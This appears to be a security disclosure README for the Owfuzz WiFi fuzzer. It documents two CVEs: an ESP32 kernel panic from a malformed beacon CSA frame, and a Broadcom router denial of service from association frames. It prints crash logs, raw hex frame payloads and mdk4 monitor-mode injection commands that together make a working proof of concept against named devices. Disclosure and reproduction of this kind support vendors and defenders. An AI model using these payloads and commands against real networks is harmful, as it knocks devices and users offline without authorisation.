# Owfuzz
[Owfuzz](https://github.com/alipay/WiFi-Protocol-Fuzzing-Tool): a WiFi protocol fuzzing tool using openwifi


# Discovered vulnerabilities


- [CVE-2021-34173](#CVE-2021-34173)
- [CVE-2021-34174](#CVE-2021-34174)
- CVE-2021-1903(Undisclosed)
- CVE-2021-33028(Undisclosed)
- CVE-2021-33029(Undisclosed)


## CVE-2021-34173

An attacker can cause a Wi-Fi Denial of Service(DoS) and kernel panic in v4.2 and earlier versions of Espressif's esp32 via a malformated beacon CSA frame. Esp32 device requires a reboot to recover.

- Crash logs
```
I (1363) wifi:AP's beacon interval = 102400 us, DTIM period = 3
I (1983) esp_netif_handlers: sta ip: 192.168.50.191, mask: 255.255.255.0, gw: 192.168.50.1
I (1983) wifi station: got ip:192.168.50.191
I (1983) wifi station: connected to ap SSID:AS password:1234567890/
I (1465583) wifi:sta rx csa, newchan=0, old=11
I (1465783) wifi:switch to channel 0
I (1465783) wifi:new:<0,0>, old:<11,0>, ap:<255,255>, sta:<0,0>, prof:1
E (1465783) wifi:wl_chm.c 329

E (1470783) task_wdt: Task watchdog got triggered. The following tasks did not reset the watchdog in time:
E (1470783) task_wdt:  - IDLE0 (CPU 0)
E (1470783) task_wdt: Tasks currently running:
E (1470783) task_wdt: CPU 0: wifi
E (1470783) task_wdt: CPU 1: IDLE1
E (1470783) task_wdt: Print CPU 0 (current core) backtrace


Backtrace:0x400D3730:0x3FFB0760 0x400828D9:0x3FFB0780 0x4010C9A2:0x3FFC05E0 0x400FE4AF:0x3FFC0600 0x4010DC03:0x3FFC0660 0x4010C5E0:0x3FFC0680 0x401 

E (1470783) task_wdt: Print CPU 1 backtrace


Backtrace:0x40081B5B:0x3FFB0D60 0x400828D9:0x3FFB0D80 0x4000BFED:0x3FFBAA60 0x40087ADD:0x3FFBAA70 0x400D3974:0x3FFBAA90 0x400D397F:0x3FFBAAC0 0x400 

E (1475783) task_wdt: Task watchdog got triggered. The following tasks did not reset the watchdog in time:
E (1475783) task_wdt:  - IDLE0 (CPU 0)
E (1475783) task_wdt: Tasks currently running:
E (1475783) task_wdt: CPU 0: wifi
E (1475783) task_wdt: CPU 1: IDLE1
E (1475783) task_wdt: Print CPU 0 (current core) backtrace


Backtrace:0x400D3730:0x3FFB0760 0x400828D9:0x3FFB0780 0x4010C9A2:0x3FFC05E0 0x400FE4AF:0x3FFC0600 0x4010DC03:0x3FFC0660 0x4010C5E0:0x3FFC0680 0x401 

E (1475783) task_wdt: Print CPU 1 backtrace


Backtrace:0x40081B5B:0x3FFB0D60 0x400828D9:0x3FFB0D80 0x4000BFED:0x3FFBAA60 0x40087ADD:0x3FFBAA70 0x400D3974:0x3FFBAA90 0x400D397F:0x3FFBAAC0 0x400 

E (1480783) task_wdt: Task watchdog got triggered. The following tasks did not reset the watchdog in time:
E (1480783) task_wdt:  - IDLE0 (CPU 0)
E (1480783) task_wdt: Tasks currently running:
E (1480783) task_wdt: CPU 0: wifi
E (1480783) task_wdt: CPU 1: IDLE1
E (1480783) task_wdt: Print CPU 0 (current core) backtrace
CVE-2021-34174

Backtrace:0x400D3730:0x3FFB0760 0x400828D9:0x3FFB0780 0x4010C9A2:0x3FFC05E0 0x400FE4AF:0x3FFC0600 0x4010DC03:0x3FFC0660 0x4010C5E0:0x3FFC0680 0x401 

E (1480783) task_wdt: Print CPU 1 backtrace


Backtrace:0x40081B5B:0x3FFB0D60 0x400828D9:0x3FFB0D80 0x4000BFED:0x3FFBAA60 0x40087ADD:0x3FFBAA70 0x400D3974:0x3FFBAA90 0x400D397F:0x3FFBAAC0 0x400 

E (1485783) task_wdt: Task watchdog got triggered. The following tasks did not reset the watchdog in time:
E (1485783) task_wdt:  - IDLE0 (CPU 0)
E (1485783) task_wdt: Tasks currently running:
E (1485783) task_wdt: CPU 0: wifi
E (1485783) task_wdt: CPU 1: IDLE1
E (1485783) task_wdt: Print CPU 0 (current core) backtrace


Backtrace:0x400D3730:0x3FFB0760 0x400828D9:0x3FFB0780 0x4010C9A2:0x3FFC05E0 0x400FE4AF:0x3FFC0600 0x4010DC03:0x3FFC0660 0x4010C5E0:0x3FFC0680 0x401 

E (1485783) task_wdt: Print CPU 1 backtrace


Backtrace:0x40081B5B:0x3FFB0D60 0x400828D9:0x3FFB0D80 0x4000BFED:0x3FFBAA60 0x40087ADD:0x3FFBAA70 0x400D3974:0x3FFBAA90 0x400D397F:0x3FFBAAC0 0x400 

E (1490783) task_wdt: Task watchdog got triggered. The following tasks did not reset the watchdog in time:
E (1490783) task_wdt:  - IDLE0 (CPU 0)
E (1490783) task_wdt: Tasks currently running:
E (1490783) task_wdt: CPU 0: wifi
E (1490783) task_wdt: CPU 1: IDLE1
E (1490783) task_wdt: Print CPU 0 (current core) backtrace

======================================================================================
I (3494) wifi station: got ip:192.168.50.242
I (3504) wifi station: connected to ap SSID:AS password:1234567890/
Guru Meditation Error: Core  0 panic'ed (LoadProhibited). Exception was unhandled.

Core  0 register dump:
PC      : 0x400f2319  PS      : 0x00060b30  A0      : 0x8008e499  A1      : 0x3ffc0f40
0x400f2319: ieee80211_recv_bar at ??:?

A2      : 0x3ffb5428  A3      : 0x3ffb92cc  A4      : 0x00000088  A5      : 0x00000018
A6      : 0x00000001  A7      : 0x00000000  A8      : 0x3ffb5448  A9      : 0x3ffb9344
A10     : 0x3ffb5428  A11     : 0x03000000  A12     : 0x00000011  A13     : 0x3ffbf010
A14     : 0x40084294  A15     : 0x80000000  SAR     : 0x00000020  EXCCAUSE: 0x0000001c
0x40084294: task_ms_to_tick_wrapper at /Users/sc3d4r/Environment/esp/esp-idf/components/esp_wifi/esp32/esp_adapter.c:401

EXCVADDR: 0x03000000  LBEG    : 0x4000c2e0  LEND    : 0x4000c2f6  LCOUNT  : 0xffffffff

Backtrace:0x400f2316:0x3ffc0f40 0x4008e496:0x3ffc0f60 0x4008e525:0x3ffc0fb0 0x400923b1:0x3ffc0fd0 0x400900f8:0x3ffc0ff0 0x40089f75:0x3ffc1020
0x400f2316: ieee80211_recv_bar at ??:?

0x4008e496: sta_input at ??:?

0x4008e525: sta_rx_cb at ??:?

0x400923b1: ppRxPkt at ??:?

0x400900f8: ppTask at ??:?

0x40089f75: vPortTaskWrapper at /Users/sc3d4r/Environment/esp/esp-idf/components/freertos/port/xtensa/port.c:168



ELF file SHA256: 20d93a4b64d36560

Rebooting...
Re-enable cpu cache.
Guru Meditation Error: Core  0 panic'ed (IllegalInstruction). Exception was unhandled.
Memory dump at 0x400e9e5c: 2e0856e1 09ad6da9 9802d222
0x400e9e5c: rtc_clk_cpu_freq_to_xtal at /Users/sc3d4r/Environment/esp/esp-idf/components/esp_hw_support/port/esp32/rtc_clk.c:439

Core  0 register dump:
PC      : 0x400e9e62  PS      : 0x00060833  A0      : 0x800876a0  A1      : 0x3ffc0d40
0x400e9e62: rtc_clk_cpu_freq_set_xtal at /Users/sc3d4r/Environment/esp/esp-idf/components/esp_hw_support/port/esp32/rtc_clk.c:510

A2      : 0x00000000  A3      : 0x3ff000c4  A4      : 0x00000000  A5      : 0x00000001
A6      : 0x3ffb92cc  A7  
0x400817a6: _xt_user_exc at /Users/sc3d4r/Environment/esp/esp-idf/components/freertos/port/xtensa/xtensa_vectors.S:697

0x400f2316: ieee80211_recv_bar at ??:?

0x4008e496: sta_input at ??:?

0x4008e525: sta_rx_cb at ??:?

0x400923b1: ppRxPkt at ??:?

0x400900f8: ppTask at ??:?

0x40089f75: vPortTaskWrapper at /Users/sc3d4r/Environment/esp/esp-idf/components/freertos/port/xtensa/port.c:168



ELF file SHA256: 20d93a4b64d36560
    : 0xffffffce  SAR     : 0x00000020  EXCCAUSE: 0x00000000
EXCVADDR: 0x03000000  LBEG    : 0x4000c2e0  LEND    : 0x4000c2f6  LCOUNT  : 0x00000000

Backtrace:0x400e9e5f:0x3ffc0d40 0x4008769d:0x3ffc0d80 0x40087107:0x3ffc0da0 0x400875f9:0x3ffc0e10 0x4008768d:0x3ffc0e60 0x400817a6:0x3ffc0e80 0x400f2316:0x3ffc0f40 0x4008e496:0x3ffc0f60 0x4008e525:0x3ffc0fb0 0x400923b1:0x3ffc0fd0 0x400900f8:0x3ffc0ff0 0x40089f75:0x3ffc1020
0x400e9e5f: rtc_clk_cpu_freq_to_xtal at ??:?

0x4008769d: panic_restart at /Users/sc3d4r/Environment/esp/esp-idf/components/esp_system/port/panic_handler.c:219

0x40087107: esp_panic_handler at /Users/sc3d4r/Environment/esp/esp-idf/components/esp_system/panic.c:354

0x400875f9: panic_handler at /Users/sc3d4r/Environment/esp/esp-idf/components/esp_system/port/panic_handler.c:185

0x4008768d: xt_unhandled_exception at /Users/sc3d4r/Environment/esp/esp-idf/components/esp_system/port/panic_handler.c:199

0x400817a6: _xt_user_exc at /Users/sc3d4r/Environment/esp/esp-idf/components/freertos/port/xtensa/xtensa_vectors.S:697

0x400f2316: ieee80211_recv_bar at ??:?

0x4008e496: sta_input at ??:?

0x4008e525: sta_rx_cb at ??:?

0x400923b1: ppRxPkt at ??:?

0x400900f8: ppTask at ??:?

0x40089f75: vPortTaskWrapper at /Users/sc3d4r/Environment/esp/esp-idf/components/freertos/port/xtensa/port.c:168



ELF file SHA256: 20d93a4b64d36560

Rebooting...
Re-enable cpu cache.
Guru Meditation Error: Core  0 panic'ed (LoadProhibited). Exception was unhandled.

Core  0 register dump:
PC      : 0x400e9e67  PS      : 0x00060133  A0      : 0x800876a3  A1      : 0x3ffc0b60
0x400e9e67: rtc_clk_cpu_freq_set_xtal at /Users/sc3d4r/Environment/esp/esp-idf/components/esp_hw_support/port/esp32/rtc_clk.c:513

A2      : 0x00000200  A3      : 0x00000001  A4      : 0x00000009  A5      : 0x00000009
A6      : 0x00000030  A7      : 0x3ffc0cc0  A8      : 0x800812eb  A9      : 0x3ffc0b30
A10     : 0x3ffc0b30  A11     : 0x3ffc0b50  A12     : 0x00000001  A13     : 0x3ffc0b40
A14     : 0x00000018  A15     : 0x3ffb0040  SAR     : 0x0000000a  EXCCAUSE: 0x0000001c
EXCVADDR: 0x0000002d  LBEG    : 0x4000c2e0  LEND    : 0x4000c2f6  LCOUNT  : 0x00000000

Backtrace:0x400e9e64:0x3ffc0b60 0x400876a0:0x3ffc0b80 0x40087107:0x3ffc0ba0 0x400875f9:0x3ffc0c10 0x4008768d:0x3ffc0c60 0x400817a6:0x3ffc0c80 0x400e9e5f:0x3ffc0d40 0x4008769d:0x3ffc0d80 0x40087107:0x3ffc0da0 0x400875f9:0x3ffc0e10 0x4008768d:0x3ffc0e60 0x400817a6:0x3ffc0e80 0x400f2316:0x3ffc0f40 0x4008e496:0x3ffc0f60 0x4008e525:0x3ffc0fb0 0x400923b1:0x3ffc0fd0 0x400900f8:0x3ffc0ff0 0x40089f75:0x3ffc1020
0x400e9e64: rtc_clk_cpu_freq_set_xtal at /Users/sc3d4r/Environment/esp/esp-idf/components/esp_hw_support/port/esp32/rtc_clk.c:511

0x400876a0: panic_restart at /Users/sc3d4r/Environment/esp/esp-idf/components/esp_system/port/panic_handler.c:217

0x40087107: esp_panic_handler at /Users/sc3d4r/Environment/esp/esp-idf/components/esp_system/panic.c:354

0x400875f9: panic_handler at /Users/sc3d4r/Environment/esp/esp-idf/components/esp_system/port/panic_handler.c:185

0x4008768d: xt_unhandled_exception at /Users/sc3d4r/Environment/esp/esp-idf/components/esp_system/port/panic_handler.c:199

0x400817a6: _xt_user_exc at /Users/sc3d4r/Environment/esp/esp-idf/components/freertos/port/xtensa/xtensa_vectors.S:697

0x400e9e5f: rtc_clk_cpu_freq_to_xtal at ??:?

0x4008769d: panic_restart at /Users/sc3d4r/Environment/esp/esp-idf/components/esp_system/port/panic_handler.c:219

0x40087107: esp_panic_handler at /Users/sc3d4r/Environment/esp/esp-idf/components/esp_system/panic.c:354

0x400875f9: panic_handler at /Users/sc3d4r/Environment/esp/esp-idf/components/esp_system/port/panic_handler.c:185

0x4008768d: xt_unhandled_exception at /Users/sc3d4r/Environment/esp/esp-idf/components/esp_system/port/panic_handler.c:199

0x400817a6: _xt_user_exc at /Users/sc3d4r/Environment/esp/esp-idf/components/freertos/port/xtensa/xtensa_vectors.S:697

0x400f2316: ieee80211_recv_bar at ??:?

0x4008e496: sta_input at ??:?

0x4008e525: sta_rx_cb at ??:?

0x400923b1: ppRxPkt at ??:?

0x400900f8: ppTask at ??:?CVE-2021-34174

0x40089f75: vPortTaskWrapper at /Users/sc3d4r/Environment/esp/esp-idf/components/freertos/port/xtensa/port.c:168



ELF file SHA256: 20d93a4b64d36560

```


- Payload
```
'\x80\x00\x00\x00\xFF\xFF\xFF\xFF\xFF\xFF\x04\xD9\xF5\x26\xFF\xC0\x04\xD9\xF5\x26\xFF\xC0\x10\x00\x00\x20\x49\x05\x00\x00\x00\x00\x64\x00\xF1\xFF\x00\x03\x41\x53\x54\x01\x08\x82\x84\x8B\x96\x12\x24\x48\x6C\x03\x01\x0B\x05\x04\x00\x01\x00\x18\x25\x00'

```


## CVE-2021-34174
This vulnerability is discovered in broadcom's BCM4352 and BCM43684 chips. Any wireless router using BCM4352 and BCM43684 will be affected, such as ASUS AX6100. An attacker may cause a Denial of Service (DoS) to any device connected to BCM4352 or BCM43684 routers by an association or reassociation frame.

- Payload
```
#association
'\x00\x00\x3A\x01\x04\xD9\xF5\x26\xFF\xC4\xD2\xAA\x07\x41\xCB\x40\x04\xD9\xF5\x26\xFF\xC4\x10\x01\xF2\xFF\x64\x00\x00\x02\x41\x53\x01\x08\x8C\x12\x98\x24\xB0\x48\x60\x6C'

#reassociation
'\x20\x00\x3A\x01\x04\xD9\xF5\x26\xFF\xC4\xD2\xAA\x07\x41\xCB\x40\x04\xD9\xF5\x26\xFF\xC4\x10\x01\xF2\xFF\x64\x00\x00\x02\x41\x53\x01\x08\x8C\x12\x98\x24\xB0\x48\x60\x6C'

```

# Reproduce & PoC
```
(1) Linux (ubuntu/kali) OS

    apt-get install pkg-config libnl-3-dev libnl-genl-3-dev libpcap-dev 
    git clone https://github.com/aircrack-ng/mdk4
    cd mdk4
    make

    cd src

    #Write payload into ./pocs/poc_test
    echo "payload hex str" > ./pocs/poc_test


(2) Reproducing this issue
    a. Connecting device to AP
    b. To see what channel the AP is working on
    c. To see the MAC address of the AP and the device
    d. Plugging a WiFi USB adapter(support monitor mode and packet injection, 2.4G/5G) into the PC(linux) and to see the usb wifi interface name.

        sudo ifconfig iface_name down
        sudo iwconfig iface_name mode monitor
        sudo ifconfig iface_name up

    e. Reproduce using mdk4: sudo mdk4 [iface_name] x -c [channel_numer] -v poc_test -s 1 -B [ap-mac] -S [ap-mac] -T [sta-mac]
```